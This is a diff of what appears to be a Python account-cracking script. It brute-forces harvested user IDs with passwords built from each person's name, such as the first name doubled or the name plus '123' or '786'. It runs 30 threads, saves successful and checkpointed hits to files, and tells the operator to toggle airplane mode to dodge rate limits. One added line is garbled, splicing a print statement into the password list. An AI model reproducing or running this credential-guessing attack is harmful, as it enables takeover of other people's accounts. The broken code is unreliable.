@@ -268,14 +268,7 @@ def first():
 				pool.submit(crack,idf,pwv)
 def name():
 	clear()
-	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			try:
-				idf,nmf = yuzong.split('|')
-				xz = nmf.split(' ')
-				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
+	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[i[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
 				else:
 					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
 				if 'mobile' in method:
@@ -410,9 +403,9 @@ logo = """
 ╚═╝░░╚═╝╚═╝░░░░░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
  \x1b[1;91m            
  \x1b[1;91m           
- \x1b[1;91m 
- \x1b[1;91m
- \x1b[1;91m
+ \x1b[1;92m 
+ \x1b[1;92m
+ \x1b[1;92m
  \x1b[1;91m 
  \x1b[1;91m                        \033[0;32m Version : 0.1
  \x1b[1;97m---------------------------------------------------
